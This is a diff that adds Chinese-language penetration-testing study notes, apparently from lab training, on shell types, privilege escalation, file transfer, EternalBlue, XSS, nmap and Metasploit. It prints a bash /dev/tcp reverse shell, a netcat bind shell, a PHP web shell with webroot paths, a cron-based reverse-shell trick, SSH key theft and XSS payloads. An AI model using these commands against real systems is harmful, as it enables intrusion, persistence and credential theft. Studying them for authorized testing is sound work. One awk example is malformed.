@@ -425,3 +425,511 @@ set FILEPATH /flag.txt
 exploit
 ```
 
+### Shell的种类
+
+| shell类型       | 沟通方式                                                     |
+| --------------- | ------------------------------------------------------------ |
+| `Reverse Shell` | 重新连接到我们的系统并通过反向连接给予我们控制权。           |
+| `Bind Shell`    | 等待我们连接它，一旦连接成功，它就赋予我们控制权。           |
+| `Web Shell`     | 通过 Web 服务器进行通信，通过 HTTP 参数接受我们的命令，执行它们，并打印回输出。 |
+
+#### Reverse shell
+
+最常见的。用natcat在我们的机器上监听特定端口。然后把那个机器上的bash连接到我们的监听器上。
+
+``` shell
+nc -lvnp 1234
+```
+
+| flag      | 描述                                                 |
+| --------- | ---------------------------------------------------- |
+| `-l`      | 监听模式，等待连接来连接我们。                       |
+| `-v`      | 详细模式，以便我们知道何时收到连接。                 |
+| `-n`      | 禁用 DNS 解析并仅连接来自/到 IP，以加快连接速度。    |
+| `-p 1234` | `netcat`正在监听的端口号，反向连接应该发送到该端口。 |
+
+首先知道自己系统的ip
+
+``` shell
+ip a
+```
+
+Reverse shell命令：
+
+``` shell
+bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
+```
+
+https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/ 这里有很多reverse shell的命令
+
+但是，A`Reverse Shell`可能非常脆弱。一旦反向 shell 命令停止，或者我们因任何原因失去连接，我们就必须使用初始漏洞再次执行反向 shell 命令以重新获得访问权限。
+
+#### Bind shell
+
+这个是我们链接到那个服务器的监听端口
+
+一旦我们执行`Bind Shell Command`，它将开始监听远程主机上的端口，并将该主机的 shell（即`Bash`或`PowerShell`）绑定到该端口。
+
+bind shell command:
+
+``` shell
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
+```
+
+#### 升级 TTY
+
+一旦我们通过 Netcat 连接到 shell，我们就会注意到我们只能输入命令或退格键，但无法左右移动文本光标来编辑命令，也无法上下移动来访问命令历史记录。为了做到这一点，我们需要升级我们的 TTY。
+
+``` shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+运行这个后，`ctrl+z` 运行在后台，然后输入
+
+``` shell
+stty raw -echo
+fg
+[Enter]
+[Enter]
+```
+
+一旦我们点击`fg`，它将把我们的`netcat`shell 带回到前台。此时，终端将显示一个空白行。我们可以`enter`再次点击以返回到我们的 shell 或输入`reset`，然后按回车键将其带回。此时，我们将拥有一个完全正常工作的 TTY shell
+
+我们可能会注意到我们的 shell 没有覆盖整个终端。为了解决这个问题，我们需要找出一些变量。我们可以在系统上打开另一个终端窗口，最大化窗口或使用我们想要的任何大小，然后输入以下命令来获取我们的变量：
+
+``` shell
+echo $TERM
+stty size
+```
+
+第一个命令向我们显示了变量，第二个命令分别向我们显示了和的`TERM`值。现在我们有了变量，我们可以返回到shell 并使用以下命令来更正它们
+
+``` shell
+export TERM=xterm-256color
+stty rows 67 columns 318
+```
+
+#### web shell
+
+`Web Shell`通常是一个 Web 脚本，即`PHP`或`ASPX`，它通过 HTTP 请求参数（例如`GET`或`POST`请求参数）接受我们的命令，执行我们的命令，并将其输出打印回网页上。
+
+Web Shell 脚本通常只有一行，非常简短，易于记忆。以下是一些常见 Web 语言的常见简短 Web Shell 脚本：
+
+``` php
+<?php system($_REQUEST["cmd"]); ?>
+```
+
+上传 Web Shell：
+
+一旦我们有了 web shell，我们就需要将 web shell 脚本放入远程主机的 web 目录 (webroot)，以便通过 web 浏览器执行该脚本。
+
+确定 webroot 的位置。以下是常见 Web 服务器的默认 webroot：
+
+| Web Server | Default Webroot        |
+| ---------- | ---------------------- |
+| `Apache`   | /var/www/html/         |
+| `Nginx`    | /usr/local/nginx/html/ |
+| `IIS`      | c:\inetpub\wwwroot\    |
+| `XAMPP`    | C:\xampp\htdocs\       |
+
+访问的时候，可以用get在浏览器访问
+
+``` shell
+?cmd=id
+```
+
+还可以用curl
+
+``` shell
+curl http://SERVER_IP:PORT/shell.php?cmd=id
+```
+
+### 权限提升
+
+最初访问远程服务器时，通常是以低权限用户的身份进行的，因此我们无法获得对服务器的完全访问权限。要获得完全访问权限，我们需要找到一个内部/本地漏洞，以便将我们的权限提升到`root`上的用户`Linux`或上的`administrator`/用户。
+
+#### PrivEsc checklist
+
+彻底枚举该盒子，以找到任何可以利用的潜在漏洞。我们可以在网上找到许多检查表和备忘单，其中包含我们可以运行的一系列检查以及运行这些检查的命令。一个很好的资源是[HackTricks](https://book.hacktricks.xyz/)，它有一个针对[Linux](https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html)和[Windows](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html)本地权限提升的出色检查表。
+
+枚举脚本：
+
+一些常见的 Linux 枚举脚本包括[LinEnum](https://github.com/rebootuser/LinEnum.git)和[linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)，而 Windows 包括[Seatbelt](https://github.com/GhostPack/Seatbelt)和[JAWS](https://github.com/411Hall/JAWS)。
+
+我们可能用于服务器枚举的另一个有用工具是[Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)，因为它维护良好，保持最新状态，并且包含用于枚举 Linux 和 Windows 的脚本。
+
+> 注意：这些脚本将运行许多已知用于识别漏洞的命令，并产生大量“噪音”，这些噪音可能会触发查找此类事件的防病毒软件或安全监控软件。这可能会阻止脚本运行，甚至触发系统已被入侵的警报。在某些情况下，我们可能希望进行手动枚举，而不是运行脚本。
+
+假设我们被允许以 root（或其他用户）身份运行特定命令。在这种情况下，我们可能能够将我们的权限升级为 root/系统用户或以其他用户身份获得访问权限。以下是利用某些用户权限的一些常见方法：
+
+* sudo
+* suid
+* Windows Token Privileges
+
+我们可以`sudo`使用以下命令检查我们拥有哪些权限
+
+``` shell
+sudo -l
+```
+
+`NOPASSWD`条目显示该`/bin/echo`命令无需密码即可执行。
+
+> ```shell-session
+> (user : user) NOPASSWD: /bin/echo
+> ```
+
+如果我们通过漏洞获得对服务器的访问权限并且没有用户密码，这将很有用。别的用户也可以用！
+
+``` shell
+sudo -u user /bin/echo Hello World!
+```
+
+一旦我们找到可以使用 运行的特定应用程序`sudo`，我们就可以寻找利用它的方法，以 root 用户身份获取 shell。GTFOBins[包含](https://gtfobins.github.io/)命令列表以及如何通过 来利用它们`sudo`。
+
+[LOLBAS](https://lolbas-project.github.io/#)还包含一个 Windows 应用程序列表
+
+#### Scheduled Tasks
+
+在 Linux 和 Windows 中，都有方法可以让脚本以特定的时间间隔运行以执行任务。
+
+1. Add new scheduled tasks/cron jobs
+2. Trick them to execute a malicious software
+
+这些目录：
+
+1. `/etc/crontab`
+2. `/etc/cron.d`
+3. `/var/spool/cron/crontabs/root`
+
+如果我们可以写入由 cron 作业调用的目录，我们可以编写一个带有反向 shell 命令的 bash 脚本，该脚本在执行时应该向我们发送一个反向 shell。
+
+#### Exposed Credentials
+
+接下来，我们可以查找可以读取的文件，看看它们是否包含任何暴露的凭据。这在`configuration`文件、`log`文件和用户历史文件中非常常见
+
+#### ssh
+
+如果我们对特定用户具有目录的读取权限，我们可以读取在`/home/user/.ssh/id_rsa`或中找到的他们的私有 ssh 密钥`/root/.ssh/id_rsa`，并使用它来登录服务器
+
+``` shell
+vim id_rsa
+chmod 600 id_rsa
+ssh root@10.10.10.10 -i id_rsa
+```
+
+> 请注意，我们在机器上创建密钥后，对密钥使用了命令“chmod 600 id_rsa”，以将文件的权限更改为更严格。如果 ssh 密钥的权限不严格，即可能被其他人读取，则 ssh 服务器会阻止它们工作。
+
+如果我们发现自己对用户`/.ssh/`目录具有写权限，我们可以将公钥放在用户的 ssh 目录中`/home/user/.ssh/authorized_keys`。
+
+我们必须首先创建一个新密钥
+
+``` shell
+ssh-keygen -f key
+```
+
+这将为我们提供两个文件：`key`（我们将与 一起使用`ssh -i`）和`key.pub`，我们将把它们复制到远程机器。让我们复制`key.pub`，然后在远程机器上，我们将其添加到`/root/.ssh/authorized_keys`：
+
+### 传输文件
+
+#### wget
+
+先用python服务器把文件夹放到监听端口
+
+``` shell
+cd /tmp
+python3 -m http.server 8000
+```
+
+远端可以
+
+``` shell
+wget http://ip:port/xx.sh
+```
+
+也可以用curl
+
+``` shell
+curl http://ip:port/xx.sh -o xx.sh
+```
+
+#### scp
+
+需要ssh
+
+``` shell
+scp xx.sh user@remotehost:/tmp/xx.sh 
+```
+
+右边是保存的远端目录
+
+在某些情况下，我们可能无法传输文件。在这种情况下，我们可以使用一个简单的技巧将文件以[base64](https://linux.die.net/man/1/base64)`base64`编码为格式，然后我们可以将`base64`字符串粘贴到远程服务器上并对其进行解码。
+
+``` shell
+base64 xx.sh -w 0
+```
+
+解码用
+
+``` shell
+base64 -d xx_base64.txt
+```
+
+验证传输的文件：
+
+``` shell
+md5sum xx.sh
+```
+
+
+
+
+
+## 漏洞
+
+### 永恒之蓝
+
+🔍 **漏洞编号**：MS17-010
+ 🔍 **影响范围**：Windows XP、Windows 7、Windows Server 2003/2008/2012 等
+ 🔍 **漏洞类型**：远程代码执行（RCE）
+ 🔍 **攻击方式**：无需身份验证即可远程攻击 Windows 机器
+
+**MS17-010** 是微软在 **2017 年 3 月** 发布的**高危漏洞补丁**，修复了 **Windows SMBv1 服务**（端口 445）中的远程代码执行漏洞。
+
+metaspllit
+
+``` shell
+set payload windows/x64/meterpreter/reverse_tcp
+```
+
+#### **反向连接（Reverse TCP）**：
+
+- **反向连接** 是一种常见的攻击技术，其中目标机器主动连接回攻击者的机器，而不是攻击者主动连接目标。
+- 这种方式可以绕过某些防火墙或网络安全控制，因为很多网络设备只会阻止外部连接进入，而允许内部机器发起连接。
+
+
+
+## XSS
+
+由于一些现代浏览器可能会在特定位置阻止`alert()`JavaScript 函数，因此了解其他一些基本的 XSS 负载可能对验证 XSS 的存在很有帮助。 其中一个这样的 XSS 负载是`<plaintext>`，它将停止呈现其后的 HTML 代码并将其显示为纯文本。 另一个容易发现的负载是 ，`<script>print()</script>`它将弹出浏览器打印对话框，不太可能被任何浏览器阻止。 尝试使用这些负载来查看每个负载的工作原理。 您可以使用重置按钮删除任何当前负载。
+
+### 存储型XSS
+
+要查看有效负载是否持久并存储在后端，我们可以刷新页面并查看是否再次收到警报。
+
+测试payload
+
+### 反射型XSS
+
+`Non-Persistent XSS`漏洞有两种类型： `Reflected XSS`，由后端服务器处理；`DOM-based XSS`，完全在客户端处理，永远不会到达后端服务器。与持久性 XSS 不同，`Non-Persistent XSS`漏洞是暂时的，不会通过页面刷新而持久。因此，我们的攻击只会影响目标用户，而不会影响访问该页面的其他用户。
+
+``` shell
+<script>alert(window.origin)</script>
+```
+
+### DOM XSS
+
+第三种也是最后一种 XSS 类型是另一种`Non-Persistent`称为 的类型`DOM-based XSS`。虽然`reflected XSS`通过 HTTP 请求将输入数据发送到后端服务器，但 DOM XSS 完全通过 JavaScript 在客户端处理。当使用 JavaScript 通过 更改页面源代码时，就会发生 DOM XSS `Document Object Model (DOM)`。
+
+``` js
+document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
+```
+
+如果我们尝试之前使用的 XSS 有效负载，我们将看到它不会执行。这是因为该`innerHTML`函数不允许将`<script>`其中的标签用作安全功能。
+
+其他payload
+
+``` html
+<img src="" onerror=alert(window.origin)>
+```
+
+### XSS 发现
+
+几乎所有 Web 应用程序漏洞扫描程序（如[Nessus](https://www.tenable.com/products/nessus)、[Burp Pro](https://portswigger.net/burp/pro)或[ZAP](https://www.zaproxy.org/)）都具有检测所有三种 XSS 漏洞的各种功能。这些扫描程序通常进行两种类型的扫描：被动扫描（检查客户端代码是否存在潜在的基于 DOM 的漏洞）和主动扫描（发送各种类型的有效负载以尝试通过在页面源中注入有效负载来触发 XSS）。
+
+一些常见的开源工具可以帮助我们发现 XSS，例如[XSS Strike](https://github.com/s0md3v/XSStrike)、[Brute XSS](https://github.com/rajeshmajumdar/BruteXSS)和[XSSer](https://github.com/epsylon/xsser)。我们可以尝试`XSS Strike`将其克隆到我们的 VM 中`git clone`：
+
+``` shell
+Fyind@htb[/htb]$ git clone https://github.com/s0md3v/XSStrike.git
+Fyind@htb[/htb]$ cd XSStrike
+Fyind@htb[/htb]$ pip install -r requirements.txt
+Fyind@htb[/htb]$ python xsstrike.py
+
+XSStrike v3.1.4
+...SNIP...
+```
+
+然后，我们可以运行该脚本并使用 为其提供一个带有参数的 URL `-u`。让我们尝试将其与`Reflected XSS`前面部分中的示例一起使用：
+
+
+
+## NMAP
+
+图像化工具 Zenmap
+
+### 基础扫描
+
+扫描常见端口，看看是不是开放的
+
+``` shell
+nmap <ip>
+```
+
+#### 知道详细的
+
+比如hostname
+
+smb服务的信息
+
+操作系统信息
+
+``` shell
+nmap -sCV <ip>
+```
+
+### 参数
+
+* `-sC` 运行 Nmap **内置的一些基础脚本**，例如：
+
+  检测 **开放端口** 是否有常见漏洞
+
+  获取 **HTTP 标题**（适用于 Web 端口）
+
+  检测 **匿名 FTP 访问**
+
+  获取 **SSH、SMB、SNMP、DNS** 信息
+
+* `-sV` **尝试识别端口上运行的服务及其版本**。
+
+  适用于检测：
+
+  - **Web 服务器版本**（Apache、Nginx）
+  - **SSH 版本**
+  - **FTP 服务器**
+  - **SMB 版本**
+  - **邮件服务器（SMTP、POP3、IMAP）**
+
+* `-oA` 项用于将 Nmap 扫描结果 **同时** 保存为 **三种不同格式** 的文件：
+
+  ``` shell
+  nmap -sC -sV -p- -oA full_scan 10.10.10.1
+  ```
+
+  保存为 
+
+  ```
+  full_scan.nmap
+  full_scan.gnmap
+  full_scan.xml
+  ```
+
+* `-p 445` 指定端口扫描
+
+* `--script safe`  选项用于**执行“安全”类别的 NSE（Nmap Scripting Engine）脚本**，这些脚本不会对目标系统造成任何破坏或异常，主要用于**信息收集**。Nmap 将 NSE 脚本分为不同类别，例如：
+
+  * **safe**（安全）
+
+  - **intrusive**（侵入性）
+
+  - **exploit**（漏洞利用）
+
+  - **vuln**（漏洞检测）
+
+  - **auth**（身份验证）
+
+  - **malware**（恶意软件检测）
+
+  nmap的scripts的路径是 `/usr/share/nmap/scripts/`
+
+  ``` shell
+  nmap -p 445 --script "vuln and safe" -Pn -n 10.10.10.40
+  ```
+
+  > 只会运行同时被分为vuln和safe分类的脚本
+
+* `-Pn` **跳过 Ping 检测**，直接进行端口扫描（适用于防火墙屏蔽 ICMP）
+* `-n` **不解析 DNS**（加快扫描速度）
+
+### 扫描脚本
+
+以 `nse` 结尾
+
+
+
+## Metasploit 
+
+
+
+### exploit
+
+* `-j` 选项的作用是让漏洞利用模块在后台运行，并将其作为一个 **作业（job）** 来处理。使用 `-j` 后，Metasploit 不会等待该漏洞利用模块的执行完毕，而是会立即返回控制台，允许用户继续执行其他操作或运行其他命令。
+
+### sessions
+
+``` shell
+sessions -i 2
+```
+
+打开第二个session交互
+
+
+
+## Linux常用
+
+### locate
+
+命令用于在 Linux 系统中**快速搜索文件或目录**，比 `find` 命令**速度更快**，但依赖于数据库（`mlocate.db`），并不是实时搜索。
+
+``` shell
+locate lue | grep .nse$
+```
+
+> **查找包含 "lue" 的文件，并筛选出以 `.nse` 结尾的文件**（Nmap 脚本文件）
+
+### less
+
+打开文件内容，但是显示更少行/
+
+* `/categor` 右斜杠可以进行搜索
+
+### grep
+
+搜索工具
+
+``` shell
+grep -r categories /path/to/directory
+```
+
+> 目录下递归地搜索包含 `categories` 关键字的文件内容。
+
+* `-r` 是递归的搜索
+
+* `-o` 只输出匹配的部分，而不是整个包含匹配的行。
+
+* `-P` 启用 Perl 兼容正则表达式（PCRE），这意味着你可以使用更复杂和强大的正则表达式
+
+  ``` shell
+  grep -r categories /usr/share/nmap/scripts/*.nse | grep -oP '".*?"'
+  ```
+
+  > 这是一个正则表达式，用于匹配在双引号内的内容。`.`：匹配除换行符以外的任何单个字符。`*`：表示前面的字符（`.`）匹配零次或多次。`?`：使 `*` 变得**非贪婪**，即尽可能少地匹配字符，而不是尽可能多地匹配字符。这样它会匹配**最小的内容**，直到遇到下一个双引号为止。
+
+### sort 
+
+对输入的行进行排序
+
+* `-u` 去重
+
+### awk
+
+`awk` 是一个强大的文本处理工具，用于处理以空格、制表符或自定义分隔符分隔的文本数据。它通常用于模式匹配、文本提取和报告生成等任务。
+
+* `-F:` 选项用于指定 **字段分隔符**，这意味着字段是以 **冒号（`:`）** 作为分隔符。 
+
+* `{print $1}` **`$1`**：在 `awk` 中，`$1` 代表 **第一个字段**（字段是通过 `-F` 选项定义的分隔符分隔的部分）
+
+  ``` shell
+  grep -r categories /usr/share/nmap/scripts/*.nse | grep default | awk -F '{print $1}'
+  ```
+
+  
+
